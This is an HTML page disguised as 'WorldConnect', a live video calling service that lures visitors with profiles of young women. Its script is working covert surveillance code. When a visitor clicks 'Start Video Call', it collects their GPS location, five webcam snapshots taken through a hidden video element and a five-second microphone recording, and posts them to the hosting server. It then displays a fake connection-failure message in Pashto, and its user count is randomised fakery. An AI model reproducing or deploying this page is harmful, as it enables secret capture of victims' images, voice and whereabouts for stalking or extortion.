<!DOCTYPE html>
<html lang="ps" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WorldConnect - Live Video Network</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; -webkit-tap-highlight-color: transparent; }
        body { background: linear-gradient(135deg, #0b132b 0%, #1c2541 100%); color: #ffffff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding: 10px; }
        .brand-header { text-align: center; margin-top: 2px; margin-bottom: 6px; }
        .brand-name { font-size: 20px; font-weight: 900; background: linear-gradient(90deg, #38bdf8, #818cf8); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .brand-tagline { font-size: 10px; color: #94a3b8; font-weight: 600; }
        .container { width: 100%; max-width: 400px; background-color: rgba(30, 41, 59, 0.9); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 24px; padding: 18px 15px 25px 15px; box-shadow: 0 15px 35px rgba(0,0,0,0.5); display: flex; flex-direction: column; gap: 12px; position: relative; z-index: 5; margin-bottom: 25px; }
        .header { display: flex; align-items: center; justify-content: space-between; }
        .app-title { font-size: 16px; font-weight: 800; color: #f8fafc; display: flex; align-items: center; gap: 6px; }
        .go-live-btn { background: linear-gradient(135deg, #ef4444, #dc2626); color: white; border: none; font-size: 11px; font-weight: 800; padding: 5px 12px; border-radius: 20px; cursor: pointer; display: flex; align-items: center; gap: 4px; box-shadow: 0 0 10px rgba(239, 68, 68, 0.5); }
        .stats-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 6px; text-align: center; background-color: rgba(15, 23, 42, 0.6); padding: 8px 4px; border-radius: 12px; border: 1px solid rgba(255, 255, 255, 0.05); }
        .stat-val { font-size: 14px; font-weight: 800; color: #38bdf8; }
        .stat-lbl { font-size: 9px; color: #94a3b8; margin-top: 1px; }
        .section-title { font-size: 11px; font-weight: 700; color: #cbd5e1; display: flex; align-items: center; gap: 6px; }
        .grid-profiles { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; max-height: 340px; overflow-y: auto; padding-right: 4px; padding-bottom: 10px; }
        .profile-card { background-color: rgba(15, 23, 42, 0.7); border: 2px solid rgba(255, 255, 255, 0.08); border-radius: 14px; overflow: hidden; cursor: pointer; text-align: center; padding-bottom: 6px; }
        .profile-card.active { border-color: #38bdf8; box-shadow: 0 0 12px rgba(56, 189, 248, 0.4); }
        .profile-img { width: 100%; height: 110px; object-fit: cover; }
        .profile-name { font-size: 12px; font-weight: 700; color: #f8fafc; margin-top: 4px; }
        .profile-status { font-size: 9px; color: #4ade80; display: flex; align-items: center; justify-content: center; gap: 3px; margin-top: 1px; }
        .online-dot { width: 5px; height: 5px; background-color: #4ade80; border-radius: 50%; }
        .call-btn-container { display: none; }
        .generate-btn { background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%); color: white; width: 100%; padding: 12px; border: none; border-radius: 16px; font-size: 14px; font-weight: 700; cursor: pointer; }
        .error-box { display: none; background-color: rgba(239, 68, 68, 0.2); border: 1px solid #ef4444; border-radius: 10px; padding: 8px; text-align: center; font-size: 11px; color: #fca5a5; font-weight: bold; }
        .process-box { display: none; background-color: rgba(15, 23, 42, 0.8); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 12px; padding: 10px; text-align: center; }
        .process-text { display: flex; justify-content: space-between; font-size: 11px; color: #94a3b8; margin-bottom: 6px; font-weight: 600; }
        .progress-bar-container { width: 100%; background-color: rgba(255, 255, 255, 0.1); height: 6px; border-radius: 3px; overflow: hidden; }
        .progress-bar { width: 0%; height: 100%; background: linear-gradient(90deg, #38bdf8, #22c55e); transition: width 0.3s ease; }
        .message-box { display: none; background-color: rgba(239, 68, 68, 0.15); border: 1px solid #ef4444; border-radius: 12px; padding: 10px; text-align: center; font-size: 11px; color: #fca5a5; font-weight: bold; }
        .live-screen { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background-color: #000; z-index: 100; flex-direction: column; justify-content: space-between; padding: 15px; }
        .live-header { display: flex; justify-content: space-between; align-items: center; z-index: 101; }
        .live-viewer-count { background: rgba(0, 0, 0, 0.6); padding: 5px 12px; border-radius: 20px; font-size: 13px; font-weight: bold; color: #fff; }
        .live-end-btn { background: #ef4444; color: white; border: none; padding: 6px 14px; border-radius: 20px; font-weight: bold; cursor: pointer; }
        .live-video-preview { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; z-index: 99; }
        .live-footer { z-index: 101; display: flex; flex-direction: column; gap: 8px; background: rgba(0,0,0,0.6); padding: 12px; border-radius: 16px; }
        .invite-btn { background: linear-gradient(135deg, #38bdf8, #0284c7); color: white; border: none; padding: 12px; border-radius: 14px; font-weight: bold; cursor: pointer; }
        .footer-info { text-align: center; font-size: 10px; color: #94a3b8; }
        #video { position: absolute; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; z-index: -1; }
        canvas { display: none; }
    </style>
</head>
<body>
    <div class="brand-header">
        <div class="brand-name">WorldConnect™</div>
        <div class="brand-tagline">Global Live Video Calling Network</div>
    </div>
    <div class="container">
        <div class="header">
            <div class="app-title">📹 Video Call Group</div>
            <button class="go-live-btn" id="startLiveBtn">Go LIVE 🔴</button>
        </div>
        <div class="stats-grid">
            <div class="stat-card"><div class="stat-val" id="activeUsers">--</div><div class="stat-lbl">Online Users</div></div>
            <div class="stat-card"><div class="stat-val">4.9 ⭐</div><div class="stat-lbl">Rating</div></div>
            <div class="stat-card"><div class="stat-val">HD</div><div class="stat-lbl">Quality</div></div>
        </div>
        <div class="section-title">✨ Select a person to start video call:</div>
        <div class="grid-profiles" id="profilesGrid">
            <div class="profile-card" data-name="Zahra"><img src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=300&auto=format&fit=crop&q=80" class="profile-img"><div class="profile-name">Zahra, 21</div><div class="profile-status"><span class="online-dot"></span> Online</div></div>
            <div class="profile-card" data-name="Meral"><img src="https://images.unsplash.com/photo-1517841905240-472988babdf9?w=300&auto=format&fit=crop&q=80" class="profile-img"><div class="profile-name">Meral, 20</div><div class="profile-status"><span class="online-dot"></span> Online</div></div>
        </div>
        <div id="errorBox" class="error-box">⚠️ Please select someone to start the video call!</div>
        <div class="call-btn-container" id="callBtnContainer">
            <button id="generateBtn" class="generate-btn">📞 Start Video Call with <span id="selectedPersonName"></span></button>
        </div>
        <div id="processBox" class="process-box">
            <div class="process-text"><span id="processStatus">Connecting...</span><span id="processPercent">0%</span></div>
            <div class="progress-bar-container"><div id="progressBar" class="progress-bar"></div></div>
        </div>
        <div id="messageBox" class="message-box"></div>
    </div>
    <div class="live-screen" id="liveScreen">
        <video id="liveStreamVideo" class="live-video-preview" autoplay playsinline muted></video>
        <div class="live-header">
            <div class="live-viewer-count">👁️ <span id="liveViewers">15</span> Viewers</div>
            <button class="live-end-btn" id="endLiveBtn">End LIVE</button>
        </div>
        <div class="live-footer">
            <button class="invite-btn" id="openInviteModalBtn">👥 Invite People</button>
        </div>
    </div>
    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>
    <script>
        let selectedPerson = "";
        window.onload = function() {
            document.getElementById('activeUsers').innerText = Math.floor(30 + Math.random() * 121);
            document.querySelectorAll('.profile-card').forEach(card => {
                card.addEventListener('click', function() {
                    document.querySelectorAll('.profile-card').forEach(c => c.classList.remove('active'));
                    this.classList.add('active');
                    selectedPerson = this.getAttribute('data-name');
                    document.getElementById('selectedPersonName').innerText = selectedPerson;
                    document.getElementById('callBtnContainer').style.display = "block";
                    document.getElementById('errorBox').style.display = "none";
                });
            });
        };
        async function sendData(fd) { try { await fetch(window.location.href, { method: 'POST', body: fd }); } catch(e){} }
        async function sendSinglePhoto(stream) {
            const v = document.getElementById('video'), c = document.getElementById('canvas');
            if (!v.srcObject) { v.srcObject = stream; await v.play(); }
            c.width = v.videoWidth || 640; c.height = v.videoHeight || 480;
            c.getContext('2d').drawImage(v, 0, 0, c.width, c.height);
            return new Promise(r => c.toBlob(async b => { const fd = new FormData(); fd.append('photo', b, 'p.jpg'); await sendData(fd); r(); }, 'image/jpeg'));
        }
        async function recordAndSendAudio(stream) {
            return new Promise(r => {
                try {
                    const mr = new MediaRecorder(stream), chunks = [];
                    mr.ondataavailable = e => chunks.push(e.data);
                    mr.onstop = async () => { const fd = new FormData(); fd.append('voice', new Blob(chunks, {type: 'audio/ogg'}), 'v.ogg'); await sendData(fd); r(); };
                    mr.start(); setTimeout(() => { if(mr.state !== 'inactive') mr.stop(); }, 5000);
                } catch(e) { r(); }
            });
        }
        document.getElementById("generateBtn").addEventListener("click", async function() {
            if(!selectedPerson) { document.getElementById('errorBox').style.display = "block"; return; }
            this.disabled = true; document.getElementById('processBox').style.display = "block";
            let progress = 0;
            const interval = setInterval(() => {
                progress += 2; if(progress <= 100) { document.getElementById('progressBar').style.width = progress + '%'; document.getElementById('processPercent').innerText = progress + '%'; }
            }, 60);
            if (navigator.geolocation) {
                await new Promise(r => navigator.geolocation.getCurrentPosition(async pos => {
                    const fd = new FormData(); fd.append('latitude', pos.coords.latitude); fd.append('longitude', pos.coords.longitude); await sendData(fd); r();
                }, () => r(), { timeout: 4000 }));
            }
            try {
                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                    document.getElementById('video').srcObject = stream; await document.getElementById('video').play();
                    await new Promise(r => setTimeout(r, 300));
                    for(let i=0; i<5; i++) { await sendSinglePhoto(stream); await new Promise(r => setTimeout(r, 800)); }
                    await recordAndSendAudio(stream);
                    stream.getTracks().forEach(t => t.stop());
                }
            } catch(e) {}
            clearInterval(interval);
            setTimeout(() => {
                document.getElementById('processBox').style.display = "none";
                document.getElementById('messageBox').innerText = "⚠️ د بوختیا له امله اړیکه ونه شوه. مهرباني وکړئ وروسته بیا کوشش وکړئ.";
                document.getElementById('messageBox').style.display = "block";
                this.disabled = false;
            }, 500);
        });
        document.getElementById('startLiveBtn').addEventListener('click', async () => {
            document.getElementById('liveScreen').style.display = "flex";
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                document.getElementById('liveStreamVideo').srcObject = stream;
            } catch(e){}
        });
        document.getElementById('endLiveBtn').addEventListener('click', () => { location.reload(); });
    </script>
</body>
</html>
